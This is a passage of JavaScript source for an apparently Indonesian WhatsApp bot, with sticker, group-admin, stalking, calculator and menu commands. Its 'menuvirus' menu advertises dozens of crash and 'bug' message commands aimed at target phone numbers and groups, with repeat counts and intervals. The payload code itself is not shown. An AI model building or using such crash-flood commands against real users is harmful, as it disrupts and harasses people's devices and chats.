let encmedia = await sock.sendImageAsSticker(m.chat, titor, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
break
case 'attp':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} Hai`)
gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
sock.sendMessage(m.chat, { sticker: gehdhe, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, { quoted: fakerikibangg })
break
case 'ttp':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} Hai`)
veireuue = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=${lolkey}&text=${encodeURI(q)}`)
sock.sendMessage(m.chat, { sticker: veireuue, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, { quoted: fakerikibangg })
break
case 'pengubahsuara': {
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 *PENGUBAH SUARA* 』
☛bass [reply vn]
☛blown [reply vn]
☛deep [reply vn]
☛earrape [reply vn]
☛fast [reply vn]
☛fat [reply vn]
☛nightcore [reply vn]
☛reverse [reply vn]
☛robot [reply vn]
☛slow [reply vn]
☛tupai [reply vn]
└──────`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: memegnu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
sock.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
break
case 'penjara': case 'creatgrup': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await sock.groupCreate(args.join(" "), [])
let response = await sock.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
m.reply(teks)
}
break
case 'ffstalk':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} 946716486`)
eeh = await ffstalk(`${q}`)
reply(`*/ Stalking Freefire \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
addCmd(command.slice(0), 1, commund)
break
case 'ghstalk':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳zMD`)
hw = await fetchJson(`https://api.github.com/users/${q}`)
sock.sendMessage(m.chat, { image: { url: hw.avatar_url }, caption: 
`*/ Stalking Github \\*

Name : ${hw.login}
Id : ${hw.id}
Node Id : ${hw.node_id}
Avatar Url : ${hw.avatar_url}
Gravatar Id : ${hw.gravatar_id}
Url : ${hw.url}
Url2 : ${hw.html_url}
Followers Url : ${hw.followers_url}
Following Url : ${hw.following_url}
Gists Url : ${hw.gists_url}
Starred Url : ${hw.starred_url}
Subscriptions Url : ${hw.subscriptions_url}
Organizations Url : ${hw.organizations_url}
Repos Url : ${hw.repos_url}
Events Url : ${hw.events_url}
Received Events Url : ${hw.received_events_url}
Type : ${hw.type}
Site Admin : ${hw.site_admin}
Name : ${hw.name}
Company : ${hw.company}
Blog : ${hw.blog}
Location : ${hw.location}
Email : ${hw.email}
Hireable : ${hw.hireable}
Bio : ${hw.bio}
Twitter Username : ${hw.twitter_username}
Public Repos : ${hw.public_repos}
Public Gists : ${hw.public_gists}
Followers : ${hw.followers}
Following : ${hw.following}
Created At : ${hw.created_at}
Updated At : ${hw.updated_at}` }, { quoted: m } )
}
addCmd(command.slice(0), 1, commund)
break
case 'npmstalk':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} @adiwajshing/baileys`)
eha = await npmstalk(`${q}`)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
addCmd(command.slice(0), 1, commund)
break
if(autorecording){
if(autorecording == false)
await sock.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await sock.sendPresenceUpdate('composing', m.chat)
} else if(available){
if(autoavailable == false)
await sock.sendPresenceUpdate('available', m.chat)
}
break
//=================================================//
case 'autosticker':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isGroupAdmins && !isCreator) return replyNya(mess.admin)
if (!isBotAdmins) return replyNya(mess.botAdmin)
					if (args[0] === '1') {
					if (isAutoSticker) return reply('Sudah Aktif Sebelumnya')
					autosticker.push(from)
					fs.writeFileSync('./command/Database/autosticker.json', JSON.stringify(autosticker))
reply(`Autosticker Berhasil Di Aktifkan !`)
					} else if (args[0] === '0') {
					autosticker.splice(from, 1)
						fs.writeFileSync('./command/Database/autosticker.json', JSON.stringify(autosticker))
reply(`Autosticker Berhasil Di Nonaktifkan !`)
					} else {
let buttons = [
{ buttonId: 'autosticker 1', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'autosticker 0', buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttons, `Mode Autosticker`, sock.user.name, m)
}
break
case 'autoresponder':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!m.isGroup) return replyNya(mess.group)
if (!isGroupAdmins && !isCreator) return replyNya(mess.admin)
if (!isBotAdmins) return replyNya(mess.botAdmin)
					if (args[0] === '1') {
					if (isAutoResponder) return reply('Sudah Aktif Sebelumnya')
					autoresponder.push(from)
					fs.writeFileSync('./command/Database/autoresponder.json', JSON.stringify(autoresponder))
reply(`AutoResponder Berhasil Di Aktifkan !`)
					} else if (args[0] === '0') {
					autoresponder.splice(from, 1)
						fs.writeFileSync('./command/Database/autoresponder.json', JSON.stringify(autoresponder))
reply(`AutoResponder Berhasil Di Nonaktifkan !`)
					} else {
let buttons = [
{ buttonId: 'autoresponder 1', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'autoresponder 0', buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttons, `Mode AutoResponder`, sock.user.name, m)
}
					break
case 'autovn': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'autoketik': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'autoavailable': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}
break
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await sock.groupInviteCode(m.chat)
sock.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await sock.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await sock.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
sock.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await sock.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 sock.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await sock.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 sock.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
sock.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'allmenu':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

Runtime : ${runtime(process.uptime())}
Speed : ${latensi.toFixed(4)} _Detik_
Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
Tanggal : ${tanggal(new Date())}
Total : ${_registered.length} User

──〇 HALO KAKAK 〇──

⚞〇 IM FROM  [ 🇮🇩 ]

┌──『 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 』
⚞☛ menuowner
⚞☛ menuvirus
⚞☛ menulainnya
⚞☛ menuislam
⚞☛ menukepo
⚞☛ menudownload
⚞☛ menugrup
⚞☛ menuvidio
⚞☛ menusuara
⚞☛ menulogo
⚞☛ menupribadi
⚞☛ pengubahsuara
└──────

⚞〇 *_NOTE :_*
⚞ *Gunakan bot dengan baik dan bijak, jangan menyalah gunakan bot yang tidak baik*
⚞ *Hidup hanya sementara, yang hebat hanya tafsiran nya*

─〇 SEMOGA BERMANFAAT 〇─
───〇 TERIMA KASIH 〇───`
let btn = [{
urlButton: {
displayText: "Grup",
url: "https://chat.whatsapp.com/CX0d2T3r76FD3tOMBbjOSI",
}
},
{ 
quickReplyButton: { 
displayText: `Owner`, 
id: `${prefix}owner` } },
{ 
quickReplyButton: { 
displayText: `Sinyal`, 
id: `${prefix}ping` } },
{ 
quickReplyButton: { 
displayText: `Dashboard`, 
id: `${prefix}dashboard` } }
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menuowner':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑 』
☛ */Owner*
☛ $ [ EXE ]
☛ > [ EVAL ]
☛ < [ EVAL2 ]
☛ => [ ASYNC ]
☛${prefix}public
☛${prefix}self
☛${prefix}out
☛${prefix}setppbot 'panjang'
☛${prefix}ban add 628××××××
☛${prefix}ban del 628××××××
☛${prefix}addowner 628×××××
☛${prefix}delowner 628×××××
☛${prefix}listban
☛${prefix}getcase
☛${prefix}bcall
☛${prefix}join
☛${prefix}creategc
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menuvirus':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐀𝐋𝐋 𝐕𝐈𝐑𝐔𝐒 』
☛ */BugMenu*

☛${prefix}bugfc (khusus grup)
☛${prefix}inibug (khusus grup)
☛${prefix}buggoib (khusus grup)
☛${prefix}sendbug (chat/grup)
☛${prefix}troli (chat/grup)
☛${prefix}troli2 (chat/grup)
☛${prefix}bug1 (chat/grup)
☛${prefix}bug2 (chat/grup)
☛${prefix}bug3 (chat/grup)
☛${prefix}bug4 (chat/grup)
☛${prefix}bug5 (chat/grup)
☛${prefix}bug6 (chat/grup)
☛${prefix}bug7 (chat/grup)
☛${prefix}buglokasi (chat/grup)
☛${prefix}livelokasi (chat/grup)
☛${prefix}buginvite (chat/grup)
☛${prefix}catalog (chat/grup)
☛${prefix}catalogpc (nomor target)
☛${prefix}cataloggc (khusus grup)
☛${prefix}ampas1 (nomor target)
☛${prefix}ampas2 (nomor target)
☛${prefix}bugstik (chat/grup)
☛${prefix}gasdek (chat/grup)
☛${prefix}bugie (chat/grup)
☛${prefix}bugbcimage (chat/grup)
☛${prefix}bugbcvideo (chat/grup)
☛${prefix}bugbcaudio (chat/grup)
☛${prefix}bugbctext (chat/grup)
☛${prefix}buttonampas (chat/grup)
☛${prefix}bugtag (khusus grup)
☛${prefix}bugtod (chat/grup)
☛${prefix}bugbokep (chat/grup)
☛${prefix}hiya (chat/grup)
☛${prefix}bugrik (chat/grup)
☛${prefix}bugsange (chat/grup)
☛${prefix}bugcrot (chat/grup)
☛${prefix}bughaha (chat/grup)
☛${prefix}bugahh (chat/grup)
☛${prefix}bugohh (chat/grup)
☛${prefix}bugngakak (chat/grup)
☛${prefix}bugwkwk (chat/grup)
☛${prefix}bugmusik (chat/grup)
☛${prefix}bugbang (chat/grup)
☛${prefix}bugnob (chat/grup)
☛${prefix}bugbot (chat/grup)
☛${prefix}bugsuhu (chat/grup)
☛${prefix}bugca (chat/grup)
☛${prefix}bugwibu (chat/grup)
☛${prefix}bugkesel (chat/grup)
☛${prefix}bugngeselin (chat/grup)
☛${prefix}bugsakit (chat/grup)
☛${prefix}gasbro (nomor target)
☛${prefix}colidek (chat/grup)
☛${prefix}gascrashar (nomor target)
☛${prefix}vncrash (nomor target) 
☛${prefix}crashar (chat/grup)
☛${prefix}jadibug1 (chat/grup)
☛${prefix}jadibug2 (chat/grup)
☛${prefix}jadibug3 (chat/grup)
☛${prefix}jadibug4 (chat/grup)
☛${prefix}jadibug5 (chat/grup)
☛${prefix}permisi (chat/grup)
☛${prefix}uwih (chat/grup)
☛${prefix}viremoji (chat/grup)
☛${prefix}virkos (chat/grup)
☛${prefix}sendbugcatalogpc (nomor target)
☛${prefix}bugpc2 (nomor target|nominal|detik)
☛${prefix}virtext (nomor target)
☛${prefix}bugpc (nomor target|nominal|detik)
☛${prefix}buggc 120363042121267107@g.us|9|9s
└──────

Masih belum paham?
chat/grup = kirim dimana aja
nomor target = 628xxxxxx
khusus grup = cuman bisa digrup
nominal = mau berapa dikirimnya
detik = 10s/5s/20s

Paham kan
Terima kasih`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menulainnya':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐎𝐓𝐇𝐄𝐑 』
☛ */Other*

─𒍮⊱${prefix}${prefix}owner
─𒍮⊱${prefix}${prefix}dashboard
─𒍮⊱${prefix}${prefix}report
─𒍮⊱${prefix}${prefix}toimg
─𒍮⊱${prefix}attp
─𒍮⊱${prefix}ttp
─𒍮⊱${prefix}sticker
𒍮⊱${prefix}emoji
─𒍮⊱${prefix}emojimix
─𒍮⊱${prefix}emojimix2
─𒍮⊱${prefix}tovidio
─𒍮⊱${prefix}togif
─𒍮⊱${prefix}tourl
─𒍮⊱${prefix}tovn
─𒍮⊱${prefix}toonce
─𒍮⊱${prefix}tomp3
─𒍮⊱${prefix}toaudio
─𒍮⊱${prefix}ebinary
─𒍮⊱${prefix}dbinary
─𒍮⊱${prefix}styletext
─𒍮⊱${prefix}smeme
─𒍮⊱${prefix}ss [url]
─𒍮⊱${prefix}${prefix}quotesanime
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menuislam':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐈𝐒𝐋𝐀𝐌 』
☛ */Islami*
☛${prefix}asmaulhusna
☛${prefix}bacaanshalat
☛${prefix}niatsholat
☛${prefix}jadwalsholat
☛${prefix}listsurah
☛${prefix}kisahnabi
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menukepo':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 』
☛ */Stalker*
☛${prefix}ffstalk 1798408813
☛${prefix}ghstalk katana
☛${prefix}igstalk ryarllh_01
☛${prefix}npmstalk @adiwajshing/baileys
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menudownload':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 』
☛ */Downloader*
☛${prefix}play
☛${prefix}ytmp4
☛${prefix}ytmp3
☛${prefix}tiktok
☛${prefix}tiktoknowm
☛${prefix}tiktokaudio
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menugrup':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐆𝐑𝐔𝐏 』
☛ */Group*
🜙${prefix}listgc
🜙${prefix}antilink on
🜙${prefix}antilink off
🜙${prefix}antionce on
🜙${prefix}antionce off
🜙${prefix}linkgroup
🜙${prefix}ephemeral [option]
🜙${prefix}setppgc [image]
🜙${prefix}setname [text]
🜙${prefix}setdesc [text]
🜙${prefix}group [option]
🜙${prefix}editinfo [option]
🜙${prefix}add @user
🜙${prefix}kick @user
🜙${prefix}ban [targer]
🜙${prefix}hidetag [text]
🜙${prefix}tagall [text]
🜙${prefix}promote @user
🜙${prefix}demote @user
🜙${prefix}vote [text]
🜙${prefix}spam [ jumlah ]
🜙${prefix}devote
🜙${prefix}inspect
🜙${prefix}getname
🜙${prefix}translate
🜙${prefix}kalkulator
🜙${prefix}intro
🜙${prefix}getpic
🜙${prefix}penjara
🜙${prefix}upvote
🜙${prefix}cekvote
🜙${prefix}hapusvote
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'tambah':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Pertambahan 

Dan Hasil Nya 
${nilai_one} + ${nilai_two} = ${nilai_one + nilai_two}`)
break
case 'kurang':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkurangan 

Dan Hasil Nya 
${nilai_one} - ${nilai_two} = ${nilai_one - nilai_two}`)
break
case 'kali':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkalian

Dan Hasil Nya 
${nilai_one} × ${nilai_two} = ${nilai_one * nilai_two}`)
break
case 'bagi':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perbagian

Dan Hasil Nya 
${nilai_one} ÷ ${nilai_two} = ${nilai_one / nilai_two}`)
break
case 'menuvidio':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
